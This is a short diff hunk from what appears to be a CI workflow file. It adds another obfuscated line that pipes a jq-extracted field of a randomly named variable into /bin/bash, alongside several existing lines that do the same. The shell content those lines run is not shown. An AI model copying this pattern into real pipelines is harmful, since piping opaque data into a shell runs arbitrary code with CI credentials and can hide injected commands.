@@ -27,6 +27,7 @@ jobs:
           echo $s9473 | jq -r .enrat35091 | /bin/bash
           printf '%s' "$vmtd2" | jq -r .lq9 | /bin/bash
           echo $ybt34 | jq -r .uolc22 | /bin/bash
+          printf '%s' "$unn36" | jq -r .tjqy28 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
